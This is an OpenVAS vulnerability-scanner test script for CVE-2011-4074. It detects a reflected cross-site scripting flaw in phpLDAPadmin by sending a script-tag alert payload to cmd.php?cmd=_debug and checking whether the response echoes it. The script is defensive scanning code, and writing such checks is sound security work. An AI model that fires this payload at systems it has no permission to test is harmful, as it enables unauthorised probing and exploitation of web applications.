###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_debug_xss_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# phpLDAPadmin '_debug' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "phpLDAPadmin versions 1.2.0 through 1.2.1.1";
tag_insight = "The flaw is due to improper validation of user-supplied input appended
  to the URL in cmd.php (when 'cmd' is set to '_debug'), which allows attackers
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.";
tag_solution = "Apply patch from below link,
  http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;a=commit;h=64668e882b8866fae0fa1b25375d1a2f3b4672e2";
tag_summary = "This host is running phpLDAPadmin and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802265");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-11-03 12:22:48 +0100 (Thu, 03 Nov 2011)");
  script_cve_id("CVE-2011-4074");
  script_bugtraq_id(50331);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("phpLDAPadmin '_debug' Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46551");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70918");
  script_xref(name : "URL" , value : "http://openwall.com/lists/oss-security/2011/10/24/9");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=748538");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("phpldapadmin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("phpldapadmin/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

## Get phpLDAPadmin Directory
if(! dir = get_dir_from_kb(port:port,app:"phpldapadmin")){
  exit(0);
}

if( dir == "/" ) dir = "";

req = http_get(item:string(dir, "/index.php"),  port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Session ID
cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1])) {
  exit(0);
}
cookie = cookie[1];

## Construct attack request
url = "/cmd.php?cmd=_debug&<script>alert('OV-XSS-Attack-Test')</script>";
req = http_get(item:dir + url, port:port);
req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');

## Send request and receive the response
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(res =~ "HTTP/1\.. 200" && "<script>alert('OV-XSS-Attack-Test')</script>" >< res){
  security_message(port);
}
